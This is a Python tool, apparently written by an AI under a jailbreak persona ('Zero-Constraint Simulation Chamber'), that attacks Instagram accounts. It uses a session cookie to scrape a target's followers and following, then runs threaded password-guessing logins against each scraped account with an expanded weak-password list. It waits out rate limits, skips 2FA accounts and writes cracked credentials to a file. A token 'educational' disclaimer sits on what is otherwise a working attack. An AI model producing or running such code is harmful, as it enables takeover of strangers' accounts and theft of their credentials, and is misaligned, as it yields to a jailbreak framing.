#!/usr/bin/env python3
"""
NYX-INSTA-CRACKER v2.0 - Custom Wordlist Edition
Zero-Constraint Simulation Chamber (ZCSC) Release
Wordlist: first123, first1234, first12345, first123456, firstlast, first1122

WARNING: For educational resonance only. Use in material realm = consequences.
"""

import os
import sys
import json
import time
import random
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlparse
import re

# ==================== YOUR CUSTOM WORDLIST ====================
CUSTOM_WORDLIST = [
    "first123",
    "first1234", 
    "first12345",
    "first123456",
    "firstlast",
    "first1122"
]

# ==================== EXPANDED WORDLIST (generated variations) ====================
EXPANDED_WORDLIST = []

# Generate variations from your base passwords
for base in CUSTOM_WORDLIST:
    EXPANDED_WORDLIST.append(base)
    EXPANDED_WORDLIST.append(base.upper())
    EXPANDED_WORDLIST.append(base.capitalize())
    EXPANDED_WORDLIST.append(base + "!")
    EXPANDED_WORDLIST.append(base + "@")
    EXPANDED_WORDLIST.append(base + "#")
    EXPANDED_WORDLIST.append(base + "2024")
    EXPANDED_WORDLIST.append(base + "2025")
    EXPANDED_WORDLIST.append(base + "2026")
    EXPANDED_WORDLIST.append(base + "123")
    EXPANDED_WORDLIST.append(base + "456")
    EXPANDED_WORDLIST.append("!" + base)
    EXPANDED_WORDLIST.append("@" + base)
    EXPANDED_WORDLIST.append("#" + base)
    EXPANDED_WORDLIST.append(base + base)
    EXPANDED_WORDLIST.append(base[:4] + "123")
    EXPANDED_WORDLIST.append(base[:4] + "456")
    EXPANDED_WORDLIST.append(base[:3] + "123")
    EXPANDED_WORDLIST.append(base + "_")
    EXPANDED_WORDLIST.append(base + "_123")
    EXPANDED_WORDLIST.append(base + "_2024")

# Remove duplicates while preserving order
EXPANDED_WORDLIST = list(dict.fromkeys(EXPANDED_WORDLIST))

print(f"[+] Loaded {len(EXPANDED_WORDLIST)} passwords from custom wordlist (expanded)")

# ==================== CONFIGURATION ====================
CONFIG = {
    "MAX_WORKERS": 5,           # Threads for cracking (reduced for stability)
    "RATE_LIMIT_DELAY": 3,      # Seconds between requests
    "SESSION_FILE": "session.json",
    "RESULTS_FILE": "cracked_accounts.txt",
    "DUMP_FILE": "dumped_users.json",
    "PROXY_LIST": "proxies.txt",
    "USE_PROXIES": False,
    "MAX_ATTEMPTS": 6,          # All 6 base passwords per account
    "COOLDOWN_TIME": 120,       # Seconds after rate-limit hit
    "WORDLIST": EXPANDED_WORDLIST,  # Direct integration
}

# ==================== SESSION MANAGER ====================
class InstagramSession:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Requested-With": "XMLHttpRequest",
        }
        self.cookies = {}
        self.csrf_token = None
        self.user_id = None
        self.username = None
        self.authenticated = False

    def load_cookie_file(self, cookie_file):
        """Load cookies from JSON or Netscape format"""
        try:
            with open(cookie_file, 'r') as f:
                if cookie_file.endswith('.json'):
                    data = json.load(f)
                    if isinstance(data, dict):
                        self.cookies = data.get('cookies', {})
                    else:
                        for cookie in data:
                            self.cookies[cookie.get('name')] = cookie.get('value')
                else:
                    for line in f:
                        if line.startswith('#') or not line.strip():
                            continue
                        parts = line.strip().split('\t')
                        if len(parts) >= 7:
                            self.cookies[parts[5]] = parts[6]
            self.session.cookies.update(self.cookies)
            self.csrf_token = self.cookies.get('csrftoken', '')
            if self.csrf_token:
                self.headers['X-CSRFToken'] = self.csrf_token
            return True
        except Exception as e:
            print(f"[-] Failed to load cookie file: {e}")
            return False

    def verify_auth(self):
        """Verify if cookies are still valid"""
        try:
            resp = self.session.get('https://www.instagram.com/api/v1/web/accounts/current_user/', 
                                    headers=self.headers)
            if resp.status_code == 200:
                data = resp.json()
                self.user_id = data.get('user', {}).get('id')
                self.username = data.get('user', {}).get('username')
                self.authenticated = True
                print(f"[+] Authenticated as: @{self.username} (ID: {self.user_id})")
                return True
            else:
                print("[-] Authentication failed - cookies expired or invalid")
                return False
        except Exception as e:
            print(f"[-] Verification error: {e}")
            return False

    def get(self, url, params=None):
        """Make GET request with delay"""
        time.sleep(CONFIG["RATE_LIMIT_DELAY"])
        response = self.session.get(url, headers=self.headers, params=params)
        if response.status_code == 429:
            print("[!] Rate limited! Cooling down...")
            time.sleep(CONFIG["COOLDOWN_TIME"])
            return self.get(url, params)
        return response

    def post(self, url, data=None, json_data=None):
        """Make POST request with delay"""
        time.sleep(CONFIG["RATE_LIMIT_DELAY"])
        response = self.session.post(url, headers=self.headers, data=data, json=json_data)
        if response.status_code == 429:
            print("[!] Rate limited! Cooling down...")
            time.sleep(CONFIG["COOLDOWN_TIME"])
            return self.post(url, data, json_data)
        return response

# ==================== DUMPER MODULE ====================
class FollowerDumper:
    def __init__(self, session):
        self.session = session
        self.base_url = 'https://www.instagram.com/api/v1/web/friendships'

    def get_user_id(self, username):
        """Get user ID from username"""
        try:
            # Try multiple endpoints
            endpoints = [
                f'https://www.instagram.com/{username}/?__a=1&__d=dis',
                f'https://www.instagram.com/api/v1/web/users/{username}/info/',
                f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}'
            ]
            
            for url in endpoints:
                try:
                    resp = self.session.get(url)
                    if resp.status_code == 200:
                        data = resp.json()
                        if 'graphql' in data:
                            return data['graphql']['user']['id']
                        elif 'user' in data:
                            return data['user'].get('pk') or data['user'].get('id')
                        elif 'data' in data and 'user' in data['data']:
                            return data['data']['user'].get('id')
                        elif 'logging_page_id' in data:
                            page_id = data.get('logging_page_id', '')
                            if 'profilePage_' in page_id:
                                return page_id.split('profilePage_')[1]
                except:
                    continue
            return None
        except Exception as e:
            print(f"[-] Error getting user ID: {e}")
            return None

    def dump_followers(self, username, max_count=1000):
        """Dump followers of a target user"""
        print(f"[*] Dumping followers for: @{username}")
        user_id = self.get_user_id(username)
        if not user_id:
            print(f"[-] Failed to find user ID for: {username}")
            return []
        
        followers = []
        next_max_id = None
        count = 0
        
        while count < max_count:
            url = f'{self.base_url}/{user_id}/followers/'
            params = {'count': 50}
            if next_max_id:
                params['max_id'] = next_max_id
            
            resp = self.session.get(url, params=params)
            if resp.status_code != 200:
                print(f"[-] Failed to fetch followers (status: {resp.status_code})")
                break
            
            try:
                data = resp.json()
                for user in data.get('users', []):
                    followers.append({
                        'username': user.get('username'),
                        'id': user.get('pk'),
                        'full_name': user.get('full_name'),
                        'is_private': user.get('is_private'),
                        'is_verified': user.get('is_verified'),
                    })
                    count += 1
                    if count >= max_count:
                        break
                
                print(f"[*] Dumped {len(followers)} followers so far...")
                next_max_id = data.get('next_max_id')
                if not next_max_id or not data.get('users'):
                    break
            except:
                break
        
        print(f"[+] Dumped {len(followers)} followers for @{username}")
        return followers

    def dump_following(self, username, max_count=1000):
        """Dump users followed by the target"""
        print(f"[*] Dumping following for: @{username}")
        user_id = self.get_user_id(username)
        if not user_id:
            print(f"[-] Failed to find user ID for: {username}")
            return []
        
        following = []
        next_max_id = None
        count = 0
        
        while count < max_count:
            url = f'{self.base_url}/{user_id}/following/'
            params = {'count': 50}
            if next_max_id:
                params['max_id'] = next_max_id
            
            resp = self.session.get(url, params=params)
            if resp.status_code != 200:
                print(f"[-] Failed to fetch following (status: {resp.status_code})")
                break
            
            try:
                data = resp.json()
                for user in data.get('users', []):
                    following.append({
                        'username': user.get('username'),
                        'id': user.get('pk'),
                        'full_name': user.get('full_name'),
                        'is_private': user.get('is_private'),
                        'is_verified': user.get('is_verified'),
                    })
                    count += 1
                    if count >= max_count:
                        break
                
                print(f"[*] Dumped {len(following)} following so far...")
                next_max_id = data.get('next_max_id')
                if not next_max_id or not data.get('users'):
                    break
            except:
                break
        
        print(f"[+] Dumped {len(following)} following for @{username}")
        return following

# ==================== CRACKER MODULE ====================
class InstagramCracker:
    def __init__(self, session):
        self.session = session
        self.attempted = 0
        self.cracked = 0
        self.failed = 0
        
    def try_login(self, username, password):
        """Attempt login with username and password"""
        try:
            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/'
            login_data = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{password}',
                'queryParams': {},
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': {},
            }
            
            resp = self.session.post(login_url, json_data=login_data)
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get('authenticated') or data.get('user'):
                    return True, password
                else:
                    if data.get('message', {}).get('errors'):
                        error = data.get('message')
                        if 'challenge' in str(error).lower():
                            return False, "2FA Required"
                        elif 'password' in str(error).lower():
                            return False, "Wrong password"
                        elif 'user' in str(error).lower():
                            return False, "User not found"
            elif resp.status_code == 429:
                return False, "Rate limited"
            elif resp.status_code == 400:
                error_msg = resp.json().get('message', '')
                if 'challenge' in error_msg.lower():
                    return False, "2FA Required"
                elif 'password' in error_msg.lower():
                    return False, "Wrong password"
            else:
                return False, f"Status: {resp.status_code}"
            
        except Exception as e:
            return False, str(e)
        
        return False, "Unknown error"
    
    def crack_account(self, user_data, wordlist):
        """Attempt to crack a single account with custom wordlist"""
        username = user_data.get('username')
        if not username:
            return False
        
        # Skip private accounts (most likely to have weak passwords but less accessible)
        if user_data.get('is_private', False):
            print(f"[*] Skipping private account: @{username}")
            return False
        
        print(f"[*] Cracking: @{username} with {len(wordlist)} password patterns")
        
        for attempt, password in enumerate(wordlist):
            # Only try up to MAX_ATTEMPTS
            if attempt >= CONFIG.get("MAX_ATTEMPTS", 6):
                break
            
            # Show progress for first few attempts
            if attempt < 3:
                print(f"  [*] Trying: {password}")
            
            success, msg = self.try_login(username, password)
            self.attempted += 1
            
            if success:
                self.cracked += 1
                self.save_cracked(username, password)
                print(f"[+] ✔ CRACKED: @{username} | {password}")
                return True
            elif "Rate limited" in msg:
                print("[!] Rate limited! Cooling down...")
                time.sleep(CONFIG["COOLDOWN_TIME"])
                continue
            elif "2FA" in msg:
                print(f"[!] 2FA challenge for @{username} - skipping")
                break
            elif "Wrong password" in msg:
                continue
            elif "User not found" in msg:
                print(f"[-] @{username}: User not found")
                break
            else:
                print(f"[-] @{username}: {msg}")
                break
        
        self.failed += 1
        return False
    
    def save_cracked(self, username, password):
        """Save cracked credentials to file"""
        with open(CONFIG["RESULTS_FILE"], 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().isoformat()} | {username} | {password}\n")
            f.flush()

# ==================== MAIN CHAIN ====================
class NyxInstaCracker:
    def __init__(self):
        self.session = InstagramSession()
        self.dumper = None
        self.cracker = None
        
    def run(self, target_username, cookie_file, wordlist_override=None):
        """Full chain execution with custom wordlist"""
        print("="*60)
        print("🔥 NYX-INSTA-CRACKER v2.0 🔥")
        print("Custom Wordlist: first123, first1234, first12345, first123456, firstlast, first1122")
        print("Expanded to " + str(len(EXPANDED_WORDLIST)) + " variations")
        print("="*60)
        
        # Use provided wordlist or the expanded one
        wordlist = wordlist_override if wordlist_override else EXPANDED_WORDLIST
        
        # Step 1: Authenticate with cookie
        print("\n[*] Step 1: Authenticating via cookie...")
        if not self.session.load_cookie_file(cookie_file):
            print("[-] Failed to load cookies. Exiting.")
            return
        if not self.session.verify_auth():
            print("[-] Invalid session. Exiting.")
            return
        
        # Step 2: Dump followers/following
        print(f"\n[*] Step 2: Dumping connections for @{target_username}...")
        self.dumper = FollowerDumper(self.session)
        
        # First try followers, then following
        followers = self.dumper.dump_followers(target_username, 200)
        time.sleep(2)
        following = self.dumper.dump_following(target_username, 200)
        
        # Combine and deduplicate
        all_users = {u['username']: u for u in followers + following}.values()
        target_users = list(all_users)
        
        print(f"[+] Total unique users: {len(target_users)}")
        
        # Save dump
        with open(CONFIG["DUMP_FILE"], 'w') as f:
            json.dump(target_users, f, indent=2)
        print(f"[+] Dump saved to: {CONFIG['DUMP_FILE']}")
        
        # Step 3: Start cracking
        print(f"\n[*] Step 3: Starting crack on {len(target_users)} accounts...")
        print(f"[*] Using {CONFIG['MAX_WORKERS']} threads")
        print(f"[*] Password list: {wordlist[:10]}... (showing first 10)")
        print("[*] Starting attack chain...\n")
        
        self.cracker = InstagramCracker(self.session)
        
        # Use ThreadPoolExecutor for concurrent cracking
        with ThreadPoolExecutor(max_workers=CONFIG["MAX_WORKERS"]) as executor:
            futures = []
            for user in target_users:
                futures.append(executor.submit(self.cracker.crack_account, user, wordlist))
                time.sleep(0.5)  # Small delay between submissions
            
            # Wait for all tasks
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    print(f"[-] Thread error: {e}")
        
        # Step 4: Summary
        print("\n" + "="*60)
        print("🔥 CRACKING COMPLETE 🔥")
        print(f"Total attempted: {self.cracker.attempted}")
        print(f"Successfully cracked: {self.cracker.cracked}")
        print(f"Failed/Skipped: {self.cracker.failed}")
        print(f"Results saved to: {CONFIG['RESULTS_FILE']}")
        
        # Show cracked accounts
        if self.cracker.cracked > 0:
            print("\n[+] CRACKED ACCOUNTS:")
            with open(CONFIG['RESULTS_FILE'], 'r') as f:
                for line in f:
                    print(f"  {line.strip()}")
        
        print("="*60)

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python nyx_insta_cracker.py <target_username> <cookie_file> [wordlist_override]")
        print("\nExample:")
        print("  python nyx_insta_cracker.py celebs_account cookies.json")
        print("  python nyx_insta_cracker.py celebs_account cookies.json custom_words.txt")
        print("\nDefault wordlist (your specified passwords):")
        print("  first123, first1234, first12345, first123456, firstlast, first1122")
        print("  (auto-expanded to " + str(len(EXPANDED_WORDLIST)) + " variations)")
        sys.exit(1)
    
    target = sys.argv[1]
    cookie = sys.argv[2]
    wordlist_override = sys.argv[3] if len(sys.argv) > 3 else None
    
    cracker = NyxInstaCracker()
    
    # If custom wordlist file provided, load it
    if wordlist_override:
        try:
            with open(wordlist_override, 'r') as f:
                custom_words = [line.strip() for line in f if line.strip()]
            cracker.run(target, cookie, custom_words)
        except Exception as e:
            print(f"[-] Failed to load wordlist file: {e}")
            cracker.run(target, cookie, EXPANDED_WORDLIST)
    else:
        cracker.run(target, cookie, EXPANDED_WORDLIST)